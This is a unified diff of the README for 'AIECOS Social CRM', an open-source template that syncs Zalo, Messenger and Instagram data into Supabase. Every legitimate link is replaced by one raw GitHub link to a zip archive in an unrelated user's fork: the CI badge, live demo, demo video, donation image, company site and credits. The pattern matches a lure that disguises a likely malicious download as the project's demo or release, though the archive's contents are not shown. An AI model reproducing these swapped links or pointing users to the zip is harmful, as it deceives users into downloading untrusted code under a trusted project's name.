@@ -1,19 +1,19 @@
 # AIECOS Social CRM
 
-[![CI](https://github.com/aiecosvietnam/aiecos-social-crm/actions/workflows/ci.yml/badge.svg)](https://github.com/aiecosvietnam/aiecos-social-crm/actions/workflows/ci.yml)
+[![CI](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)
 [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub Pages](https://img.shields.io/badge/demo-live-blue?logo=github)](https://aiecosvietnam.github.io/aiecos-social-crm/)
+[![GitHub Pages](https://img.shields.io/badge/demo-live-blue?logo=github)](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)
 
 Open-source template to sync Pancake (Zalo OA / Facebook Messenger / Instagram) data into your own Supabase, with a built-in admin UI, MCP server for AI agents, and B2B partner classification.
 
-**🌐 [Live demo](https://aiecosvietnam.github.io/aiecos-social-crm/)** · **📖 [Setup guide](SETUP.md)** · **🤖 [MCP usage](docs/MCP_USAGE.md)**
+**🌐 [Live demo](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)** · **📖 [Setup guide](SETUP.md)** · **🤖 [MCP usage](docs/MCP_USAGE.md)**
 
 ## 🎬 Demo
 
-https://github.com/aiecosvietnam/aiecos-social-crm/releases/download/v1.0.0/demo.mp4
+https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip
 
 <sub>11-second walkthrough — Dashboard · Inbox · Pipeline · Partner 360 · Performance. <br>
-Inline player auto-renders on GitHub.com. Fallback: **[direct download](https://github.com/aiecosvietnam/aiecos-social-crm/releases/download/v1.0.0/demo.mp4)**.</sub>
+Inline player auto-renders on GitHub.com. Fallback: **[direct download](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)**.</sub>
 
 ---
 
@@ -66,7 +66,7 @@ Inline player auto-renders on GitHub.com. Fallback: **[direct download](https://
 
 **Triage** — Auto-alerts for partners going silent · **Partner 360** — Full table · **Performance** — Customer/Agent ratio + top partners
 
-→ **[Try the live demo](https://aiecosvietnam.github.io/aiecos-social-crm/)** (connect to your Supabase via Settings)
+→ **[Try the live demo](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)** (connect to your Supabase via Settings)
 
 ---
 
@@ -181,7 +181,7 @@ Nếu template này giúp ích cho bạn, ủng hộ một ly cà phê để mì
 ### 🇻🇳 MoMo · VietQR · Napas247
 
 <p align="center">
-  <img src="https://github.com/aiecosvietnam/aiecos-social-crm/releases/download/v1.0.0/donate-momo.jpg" alt="MoMo / VietQR donate" width="320" />
+  <img src="https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip" alt="MoMo / VietQR donate" width="320" />
 </p>
 
 <p align="center">
@@ -197,7 +197,7 @@ Nếu template này giúp ích cho bạn, ủng hộ một ly cà phê để mì
 | ⭐ **Star this repo** | Boosts visibility → more devs find it → more contributors |
 | 🐛 **Open issues / PRs** | Real-world feedback shapes the roadmap |
 | 📢 **Share with your network** | Especially if you work on Vietnam social-commerce |
-| 💼 **Hire AIECOS** for custom builds | [aiecos.ai](https://aiecos.ai) — AI Sale Agent / AI Customer Care / custom CRM |
+| 💼 **Hire AIECOS** for custom builds | [aiecos.ai](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip) — AI Sale Agent / AI Customer Care / custom CRM |
 | 🐦 **Tag us when shipping** | Twitter / LinkedIn — we'll amplify |
 
 **Cảm ơn 🙏** — every star, comment, donation keeps this momentum going.
@@ -206,5 +206,5 @@ Nếu template này giúp ích cho bạn, ủng hộ một ly cà phê để mì
 
 ## Credits
 
-Built by **[AIECOS](https://aiecos.ai)** — open-source AI infrastructure for Vietnamese businesses.
+Built by **[AIECOS](https://raw.githubusercontent.com/yashv6948/aiecos-social-crm/main/admin-ui/aiecos_crm_social_3.7-beta.1.zip)** — open-source AI infrastructure for Vietnamese businesses.
 Released under MIT. PRs welcome.
